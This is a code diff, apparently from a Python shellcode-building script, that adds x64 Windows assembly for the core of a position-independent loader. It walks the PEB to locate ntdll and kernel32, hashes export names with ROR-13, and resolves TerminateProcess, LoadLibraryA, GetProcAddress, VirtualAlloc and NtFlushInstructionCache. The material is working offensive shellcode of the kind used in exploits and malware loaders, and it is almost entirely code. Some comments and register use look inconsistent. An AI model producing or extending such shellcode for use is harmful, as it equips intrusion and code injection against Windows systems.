@@ -17,6 +17,113 @@ CODE = (
     "   jne dll_compare                 ;"
     "dll_base_found:                     "
     "   mov r12, rsi                    ;"  # R12 has DLL base address
+    #STEP 1 : process the kernels exports for the functions our loader needs...
+    "find_ntdll:                         "
+    "   xor rcx, rcx                    ;"  # Zeroing RCX content
+    "   mov rax, gs:[rcx+0x60]          ;"  # 0x060 ProcessEnvironmentBlock to RAX
+    "   mov rax, [rax+0x18]             ;"  # 0x18 ProcessEnvironmentBlock.Ldr Offset
+    "   mov rsi, [rax+0x20]             ;"  # 0x20 ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
+    "   mov rax, [rsi]                  ;"  # Load qword at address (R)SI into RAX
+    "   mov r13, [rax+0x20]             ;"  # R13 = NTDLL base address
+    "find_kernel32:                      "
+    "   xchg rax, rsi                   ;"  # Swap RAX,RSI
+    "   lodsq                           ;"  # Load qword at address (R)SI into RAX
+    "   mov r14, [rax + 0x20]           ;"  # R14 = KERNEL32 base address
+    "find_function_shorten:              "
+    "   jmp find_function_shorten_bnc   ;"
+    "find_function_ret:                  "
+    "   pop rsi                         ;"
+    "   mov [rbp+0x08], rsi             ;"
+    "   jmp resolve_symbols_kernel32    ;"
+    "find_function_shorten_bnc:          "
+    "   call find_function_ret          ;"
+    "find_function:                      "
+    "   push rbp                        ;"
+    "   mov rbp, rsp                    ;"
+    "   sub rsp, 0x30                   ;"
+    "   push rbx                        ;"
+    "   mov r8, rbx                     ;"  # Copy Kernel32 base address to R8 register
+    "   mov ebx, [rbx + 0x3C]           ;"  # Get Kernel32 PE Signature (offset 0x3C) into EBX
+    "   add rbx, r8                     ;"  # Add defrerenced signature offset to kernel32 base. Store in RBX.
+    "   xor r9, r9                      ;"  # Offset from PE32 Signature to Export Address Table
+    "   add r9, 0x88FFFFF               ;"  # |
+    "   shr r9, 0x14                    ;"  # |
+    "   mov edx, [rbx+r9]               ;"  # Offset from PE32 Signature to Export Address Table
+    "   add rdx, r8                     ;"  # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
+    "   mov r10d, [rdx + 0x14]          ;"  # Number of functions
+    "   xor r11, r11                    ;"  # Zero R11 before use
+    "   mov r11d, [rdx+0x20]            ;"  # AddressOfNames RVA
+    "   add r11, r8                     ;"  # AddressOfNames VMA
+    "   mov rdi, r10                    ;"  # Set loop counter
+    "find_function_loop:                 "
+    "   jecxz find_function_finished    ;"  # Jump to the end if RCX is 0
+    "   dec rdi                         ;"  # Decrement our loop by one
+    "   xor rsi, rsi                    ;"  # Zero RSI for use
+    "   mov esi, [r11+rdi*4]            ;"  # ESI = RVA for first AddressOfName
+    "   add rsi, r8                     ;"  # RSI = Function name VMA
+    "compute_hash:                       "
+    "   xor eax, eax                    ;"  # NULL EAX
+    "   xor r15, r15                    ;"  # NULL r15
+    "   cld                             ;"  # Clear direction
+    "compute_hash_again:                 "
+    "   lodsb                           ;"  # Load the next byte from rsi into al
+    "   test al, al                     ;"  # Check for NULL terminator
+    "   jz compute_hash_finished        ;"  # If the ZF is set, we've hit the NULL term
+    "   ror r15d, 0x0d                  ;"  # Rotate edx 13 bits to the right
+    "   add r15d, eax                   ;"  # Add the new byte to the accumulator
+    "   jmp compute_hash_again          ;"
+    "compute_hash_finished:              "
+    "find_function_compare:              "
+    "   cmp r15, rcx                    ;"  # Compare the computed hash with the requested hash
+    "   jnz find_function_loop          ;"
+    "   xor r11, r11                    ;"
+    "   mov r11d, [rdx + 0x24]          ;"  # AddressOfNameOrdinals RVA
+    "   add r11, r8                     ;"  # AddressOfNameOrdinals VMA
+    "   xor r15, r15                    ;"
+    "   mov r15w, [r11+rdi*2]           ;"  # AddressOfNameOrdinals + Counter. RCX = counter
+    "   xor r11, r11                    ;"  
+    "   mov r11d, [rdx + 0x1c]          ;"  # AddressOfFunctions RVA
+    "   add r11, r8                     ;"  # AddressOfFunctions VMA
+    "   mov eax, [r11+r15*4]            ;"  # Get the function RVA
+    "   add rax, r8                     ;"  # Get the function VMA
+    "   mov r14, rax                    ;"  # Preserve function address in R14
+    "find_function_finished:             "
+    "   pop rbx                         ;"
+    "   add rsp, 0x30                   ;"
+    "   pop rbp                         ;"
+    "   ret                             ;"
+    "resolve_symbols_kernel32:           "
+    "   mov rbx, r14                    ;"  # Moving Kernel32 base address to RBX
+    #"   push qword 0x78b5b983           ;"  # TerminateProcess hash
+    "   mov ecx, 0x78b5b983             ;"
+    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
+    "   mov [rbp+0x20], rax             ;"  # Save TerminateProcess address
+    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
+    #"   mov eax, 0xec0e4e8e             ;"  # we are moving value to a register
+    #"   push rax                        ;"  # and then push to stack
+    "   mov ecx, 0xec0e4e8e             ;"
+    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
+    "   mov [rbp+0x28], rax             ;"  # Save LoadLibraryA address for later usage
+    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
+    #"   mov eax, 0x7c0dfcaa             ;"  # we are moving value to a register
+    #"   push rax                        ;"  # and then push to stack
+    "   mov ecx, 0x7c0dfcaa             ;"
+    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
+    "   mov [rbp+0x38], rax             ;"  # Save GetProcAddress address for later usage
+    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
+    #"   mov eax, 0x91afca54             ;"  # we are moving value to a register
+    #"   push rax                        ;"  # and then push to stack
+    "   mov ecx, 0x91afca54             ;"
+    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
+    "   mov [rbp+0x40], rax             ;"  # Save VirtualAlloc address for later usage
+    "resolve_symbols_ntdll:              "
+    "   mov rbx, r13                    ;"  # Moving Ntdll base address to RBX
+    #"   xor rax, rax                    ;"  # Same as push imm64, due to keystone error,
+    #"   mov eax, 0x534c0ab8             ;"  # we are moving value to a register
+    #"   push rax                        ;"  # and then push to stack
+    "   mov ecx, 0x534c0ab8             ;"
+    "   call qword ptr [rbp+0x08]       ;"  # Call find_function
+    "   mov [rbp+0x48], rax             ;"  # Save NtFlushInstructionCache address for later usage
  )
 
 ks = Ks(KS_ARCH_X86, KS_MODE_64)
